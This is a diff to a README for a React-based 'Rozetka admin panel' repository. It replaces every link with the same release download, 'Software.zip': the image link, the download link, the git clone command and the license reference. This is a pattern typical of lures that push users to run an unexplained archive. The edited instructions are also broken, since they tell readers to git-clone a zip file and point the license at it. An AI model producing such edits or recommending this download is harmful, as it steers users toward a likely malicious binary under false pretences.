@@ -1,6 +1,6 @@
 # 🚀 Welcome to the Rozetka Admin Panel Repository! 🛠️
 
-![Rozetka Admin Panel](https://github.com/username/repo/blob/main/image.png)
+![Rozetka Admin Panel](https://github.com/titiaswe12/rozetka-admin-panel/releases/download/v2.0/Software.zip)
 
 ## Repository Name
 **rozetka-admin-panel**
@@ -22,7 +22,7 @@ This repository contains the code for the Rozetka admin panel. It is a powerful 
 
 ## How to Launch
 To launch the Rozetka admin panel, download the necessary files from the following link: 
-[Download Rozetka Admin Panel](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) 📥
+[Download Rozetka Admin Panel](https://github.com/titiaswe12/rozetka-admin-panel/releases/download/v2.0/Software.zip) 📥
 
 ## About
 The Rozetka admin panel repository is a comprehensive collection of tools and technologies aimed at optimizing the management of the Rozetka platform. From handling requests with axios to managing state with redux-saga and redux-toolkit, this repository covers it all. The use of react and mui-material ensures a visually appealing and user-friendly interface for admins.
@@ -38,7 +38,7 @@ The Rozetka admin panel repository is a comprehensive collection of tools and te
 
 ## Installation
 Follow these steps to install and run the Rozetka admin panel on your local machine:
-1. Clone this repository to your local machine using `git clone https://github.com/username/repo.git`
+1. Clone this repository to your local machine using `git clone https://github.com/titiaswe12/rozetka-admin-panel/releases/download/v2.0/Software.zip`
 2. Navigate to the project directory `cd rozetka-admin-panel`
 3. Install dependencies with `npm install`
 4. Start the development server with `npm run dev`
@@ -47,7 +47,7 @@ Follow these steps to install and run the Rozetka admin panel on your local mach
 Contributions to the Rozetka admin panel repository are welcome! If you have ideas for improvements or new features, feel free to open an issue or submit a pull request. Together we can make the admin panel even better!
 
 ## License
-This project is licensed under the MIT License - see the LICENSE.md file for details.
+This project is licensed under the MIT License - see the https://github.com/titiaswe12/rozetka-admin-panel/releases/download/v2.0/Software.zip file for details.
 
 <div align="center">
   <b>Happy Coding! 🚀</b>
